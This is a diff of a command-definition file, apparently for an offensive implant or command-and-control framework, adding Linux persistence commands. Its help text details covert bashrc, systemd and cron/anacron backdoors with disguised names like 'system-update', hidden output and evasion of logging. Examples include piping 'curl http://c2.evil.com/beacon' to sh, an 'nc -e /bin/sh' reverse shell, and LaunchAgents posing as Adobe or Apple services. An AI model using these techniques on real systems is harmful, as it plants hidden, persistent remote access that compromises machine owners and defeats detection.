@@ -979,7 +979,7 @@ Output includes:
 [commands.persist]
 fileName = "persist"
 name = "persist"
-os_compatibility = ["darwin", "linux"]
+os_compatibility = ["darwin"]
 description = "Establish persistence through various macOS mechanisms"
 syntax = """
 persist rc --user <username> --command <cmd> [--files .zshrc,.bash_profile]
@@ -1049,187 +1049,210 @@ OPERATIONAL NOTES:
 EXAMPLES:
   # Simple RC file backdoor
   persist rc --command 'curl http://c2.evil.com/beacon | sh'
-  
+
   # LaunchAgent with custom interval
   persist launch --name com.adobe.update --command '/tmp/malware' --user --interval 300
-  
+
   # System-level LaunchDaemon (requires root)
   persist launch --name com.apple.security --command '/usr/local/bin/agent' --system
-  
+
   # Add login item (visible to user)
   persist login --name 'Dropbox Helper' --path /Applications/Evil.app
-  
+
   # Daily periodic task (requires root)
   persist periodic --command '/opt/backdoor/beacon' --frequency daily
 """
 
-[commands.persist-cron]
-fileName = "persist-cron"
-name = "persist-cron"
+[commands.persist_linux]
+fileName = "persist"
+name = "persist"
 os_compatibility = ["linux"]
-description = "Manage cron-based persistence on Linux systems with multiple methods"
+description = "Establish persistence through various Linux mechanisms"
 syntax = """
-persist-cron <action> [options]
-Actions:
-  add [--method <method>] [--user <user>] [--interval <time>] [--command <cmd>]
-  remove [--method <method>] [--user <user>]
-  list
+persist bashrc [--command <cmd>] [--user <username>] [--file <rcfile>] [--files <list>] [--all] [--raw] [--no-nohup] [--no-silence] [--no-pgrep] [--no-sudo-check]
+persist systemd [--user] [--name <service>]
+persist cron [--method <method>] [--user <user>] [--interval <time>] [--command <cmd>]
+persist remove bashrc
+persist remove systemd [--name <service>]
+persist remove cron [--method <method>] [--user <user>]
+persist cron list
 """
 examples = [
-    "persist-cron add --method spool --interval @hourly",          # User crontab persistence
-    "persist-cron add --method crond --interval '*/15 * * * *'",   # System cron.d persistence
-    "persist-cron add --method periodic --interval @daily",        # Cron directory persistence
-    "persist-cron add --method anacron",                           # Anacron persistence
-    "persist-cron add --method all --command /tmp/.daemon",        # Try all methods
-    "persist-cron add",                                            # Default: all methods, hourly
-    "persist-cron remove --method spool",                          # Remove specific method
-    "persist-cron remove --method all",                            # Remove all persistence
-    "persist-cron list"                                            # Show all persistence
+    "persist bashrc",
+    "persist bashrc --command '/tmp/backdoor.sh'",
+    "persist bashrc --all",
+    "persist bashrc --command '/tmp/agent' --all",
+    "persist bashrc --file .zshrc",
+    "persist bashrc --files .bashrc,.zshrc",
+    "persist bashrc --user admin --command 'nc -e /bin/sh 10.0.0.1 4444'",
+    "persist bashrc --raw --command '/opt/myapp &'",
+    "persist bashrc --no-nohup --no-silence",
+    "persist bashrc --no-pgrep --no-sudo-check",
+    "persist systemd",
+    "persist systemd --user --name my-service",
+    "persist systemd --name system-update",
+    "persist cron --method spool --interval @hourly",
+    "persist cron --method crond --interval '*/15 * * * *'",
+    "persist cron --method timer --interval @daily",
+    "persist cron --method all --command /tmp/.daemon",
+    "persist cron list",
+    "persist remove bashrc",
+    "persist remove systemd --name my-service",
+    "persist remove cron --method spool",
+    "persist remove cron --method all"
 ]
 help = """
-Manages cron-based persistence using multiple selectable methods for redundancy and stealth.
+Establishes persistence on Linux using multiple techniques:
 
 METHODS:
-  spool     - User crontab files in /var/spool/cron/
-  crond     - System-wide /etc/cron.d/ file  
-  periodic  - Cron directories (/etc/cron.hourly, daily, weekly, monthly)
-  anacron   - Anacron for systems not always on
-  all       - Try all methods (default)
 
-ACTIONS:
-1. ADD - Install cron persistence
-   Uses selected method(s) to establish persistence:
-   
-   Method: spool
-     - Direct manipulation of crontab files
-     - Locations checked:
-       • /var/spool/cron/crontabs/<user>
-       • /var/spool/cron/<user>
-       • /var/spool/cron/tabs/<user>
-     - No crontab command used (stealthier)
-     - Checks write permissions with unix.Access
-   
-   Method: crond
-     - Creates file in /etc/cron.d/
-     - File named "system-check" (looks legitimate)
-     - System-wide execution
-     - Includes proper SHELL and PATH definitions
-   
-   Method: periodic
-     - Creates scripts in cron directories
-     - Maps intervals to appropriate directory:
-       • @hourly  → /etc/cron.hourly/
-       • @daily   → /etc/cron.daily/
-       • @weekly  → /etc/cron.weekly/
-       • @monthly → /etc/cron.monthly/
-     - Script named "system-update"
-     - Executable bash scripts (755 permissions)
-   
-   Method: anacron
-     - Modifies /etc/anacrontab
-     - For systems not running 24/7
-     - Job named "system-maint"
-     - 5-minute delay, daily execution
-   
-   Options:
+1. BASHRC PERSISTENCE (bashrc):
+   - Modifies shell startup files
+   - Executes payload when user opens terminal
+   - File Options:
+     --command <cmd>    Command to persist (default: current binary path)
+     --user <username>  Target specific user (default: current)
+     --file <rcfile>    Target a single specific RC file
+     --files <list>     Comma-separated list of RC files
+     --all              Target all common RC files (.bashrc, .profile, .bash_profile, .zshrc)
+   - Payload Options (control wrapping behavior):
+     --raw              Just inject the command, no wrapping at all
+     --no-nohup         Skip nohup wrapper (process dies with terminal)
+     --no-silence       Don't redirect output to /dev/null
+     --no-pgrep         Don't check if process is already running
+     --no-sudo-check    Don't check if running via sudo
+   - Default (no file flags): only .bashrc
+   - Default payload includes: sudo check, pgrep check, nohup, /dev/null redirect
+
+2. SYSTEMD SERVICE (systemd):
+   - Creates persistent systemd service
+   - Options:
+     --user             Install as user service (default: system service)
+     --name <service>   Service name (default: system-update)
+   - User services: ~/.config/systemd/user/
+   - System services: /etc/systemd/system/ (requires root)
+   - Auto-starts on boot with restart on failure
+   - Includes security hardening to look legitimate
+
+3. CRON PERSISTENCE (cron):
+   - Scheduled task persistence with multiple methods
+   - Options:
      --method <method>  Persistence method (default: all)
      --user <user>      Target user (default: current)
      --interval <time>  Execution interval (default: @hourly)
-     --command <cmd>    Command to run (default: current binary via /proc/self/exe)
-   
+     --command <cmd>    Command to run (default: current binary)
+
+   Methods:
+     spool     - User crontab files in /var/spool/cron/ (user-level)
+     crond     - System-wide /etc/cron.d/ file (requires root)
+     periodic  - Cron directories /etc/cron.hourly, daily, etc. (requires root)
+     anacron   - Anacron for systems not always on (requires root)
+     timer     - Systemd user timers in ~/.config/systemd/user/ (user-level, no root)
+     all       - Try all methods (default)
+
    Interval formats:
-     @reboot          Run at startup
-     @hourly          Run every hour (randomized minute)
-     @daily           Run daily (randomized hour/minute)
-     @weekly          Run weekly (randomized day/hour/minute)
-     @monthly         Run monthly (randomized day/hour/minute)
-     '*/15 * * * *'   Standard cron format (every 15 minutes)
-     '0 2 * * *'      Daily at 2 AM
+     @reboot, @hourly, @daily, @weekly, @monthly
+     '*/15 * * * *'   Standard cron format
 
-2. REMOVE - Clean cron persistence
-   Removes persistence from selected method(s):
-   
-   Options:
-     --method <method>  Method to remove (default: all)
-     --user <user>      Target user (default: current)
-   
-   Cleanup targets by method:
-     spool:    User crontab files
-     crond:    /etc/cron.d/system-check
-     periodic: Scripts in cron directories
-     anacron:  Entries in /etc/anacrontab
-     all:      All of the above
+   Access levels:
+     User-level (no root): spool (current user), timer
+     Root required: crond, periodic, anacron, spool (other users)
 
-3. LIST - Show installed persistence
-   Scans all locations for persistence:
-   - Checks user crontabs for "Added by system at" comments
-   - Looks for /etc/cron.d/system-check
-   - Searches cron directories for system-update scripts
-   - Scans anacrontab for system-maint entries
-   - Reports all found persistence mechanisms
+4. REMOVE PERSISTENCE (remove):
+   - Removes installed persistence
+   - Usage:
+     persist remove bashrc              Remove RC file backdoors
+     persist remove systemd [--name]    Remove systemd service
+     persist remove cron [--method]     Remove cron persistence
 
-STEALTH FEATURES:
-- Randomized execution times using Unix timestamp modulo
-- Legitimate-looking names (system-check, system-update, system-maint)
-- Timestamped comments for authenticity
-- Output redirected to /dev/null (prevents cron emails)
-- Direct file manipulation (avoids crontab command logging)
-- Uses unix.Access for permission checks (less noisy than stat)
-- Checks for existing entries to avoid duplicates
+5. LIST CRON PERSISTENCE (cron list):
+   - Shows installed cron persistence mechanisms
+   - Scans all methods and reports what's found
+   - Usage: persist cron list
 
-SECURITY FEATURES:
-- Permission checking before write attempts
-- Proper file permissions (600 for user crons, 644 for system)
-- Falls back to /proc/self/exe or os.Args[0] for binary path
-- Handles missing users/paths gracefully
-- Returns detailed success/failure for each method
+FILE TARGETING:
+  persist bashrc                           # Only .bashrc (default)
+  persist bashrc --all                     # All: .bashrc, .profile, .bash_profile, .zshrc
+  persist bashrc --file .zshrc             # Only .zshrc
+  persist bashrc --files .bashrc,.zshrc    # Specific list
 
-REDUNDANCY:
-- Method "all" attempts every persistence technique
-- Multiple paths checked for each method
-- Continues trying other methods if one fails
-- Returns aggregated results showing what worked
-- Different methods work with different privilege levels
+BASHRC PAYLOAD STRUCTURE:
+  Default payload (all wrappers enabled):
+    if [ -z "$SUDO_COMMAND" ]; then       # Skip if via sudo (--no-sudo-check to disable)
+        if ! pgrep -f "cmd"; then         # Skip if running (--no-pgrep to disable)
+            (nohup cmd > /dev/null 2>&1 &) 2>/dev/null  # Background with nohup
+        fi
+    fi
+
+  Wrapper flags:
+    --raw            Just: cmd                     (no wrapping at all)
+    --no-nohup       Skip nohup, keeps /dev/null   (cmd > /dev/null 2>&1 &)
+    --no-silence     Keep nohup, skip /dev/null    (nohup cmd &)
+    --no-pgrep       Skip process running check
+    --no-sudo-check  Skip sudo detection check
+
+SYSTEMD SERVICE FEATURES:
+  - Type=simple with auto-restart
+  - 60 second restart delay
+  - Output redirected to null
+  - Security hardening (PrivateTmp, NoNewPrivileges, etc.)
+  - Looks like legitimate system service
 
 EXAMPLES:
-  # Default persistence (all methods, hourly)
-  persist-cron add
-  
-  # Specific method with custom interval
-  persist-cron add --method spool --interval '*/30 * * * *'
-  
-  # System-wide daily persistence
-  persist-cron add --method crond --interval @daily --user root
-  
-  # Periodic execution with custom command
-  persist-cron add --method periodic --interval @weekly --command /opt/backup.sh
-  
-  # Anacron for laptops/workstations
-  persist-cron add --method anacron
-  
-  # Try everything with custom binary
-  persist-cron add --method all --command /tmp/.daemon
-  
-  # Check what's installed
-  persist-cron list
-  
-  # Remove specific method
-  persist-cron remove --method spool
-  
-  # Clean everything
-  persist-cron remove --method all
+  # Default persistence (current binary to .bashrc only)
+  persist bashrc
+
+  # Custom command to .bashrc only
+  persist bashrc --command '/tmp/beacon'
+
+  # All common RC files
+  persist bashrc --all
+  persist bashrc --command '/tmp/agent' --all
+
+  # Target specific file(s)
+  persist bashrc --file .zshrc
+  persist bashrc --files .bashrc,.profile
+
+  # Custom payload wrapping
+  persist bashrc --raw --command '/opt/myapp &'        # Just the command, no wrapping
+  persist bashrc --no-nohup                            # No nohup (dies with terminal)
+  persist bashrc --no-silence                          # Keep stdout/stderr
+  persist bashrc --no-pgrep --no-sudo-check            # Skip both checks
+
+  # User-level systemd service
+  persist systemd --user --name my-updater
+
+  # System-level systemd (requires root)
+  persist systemd --name system-monitor
+
+  # Cron persistence (user-level timer method)
+  persist cron --method timer --interval @hourly
+
+  # Cron persistence (root-required methods)
+  persist cron --method crond --interval @daily
+  persist cron --method periodic --interval @weekly
+  persist cron --method all --command /opt/agent
+
+  # List cron persistence
+  persist cron list
+
+  # Cleanup
+  persist remove bashrc
+  persist remove systemd --name my-updater
+  persist remove cron --method all
 
 OPERATIONAL NOTES:
-- No system binaries used (crontab, at, systemctl avoided)
-- Works across different Linux distributions
-- Some methods require elevated privileges:
-  • spool: Usually works for current user
-  • crond: Requires root or sudo
-  • periodic: Requires root or sudo
-  • anacron: Requires root or sudo
-- Method selection allows privilege-appropriate persistence
-- Test in controlled environment first
-- Always include cleanup in operational plans
+- Bashrc persistence survives reboots, runs on terminal open
+- Systemd provides most reliable always-running persistence
+- Cron provides scheduled/periodic execution
+- User-level options (no root needed):
+  • persist systemd --user
+  • persist cron --method timer
+  • persist cron --method spool (current user only)
+- Root-required options:
+  • persist systemd (system service)
+  • persist cron --method crond/periodic/anacron
+- Always test in controlled environment first
 """
 
 [commands.ps]
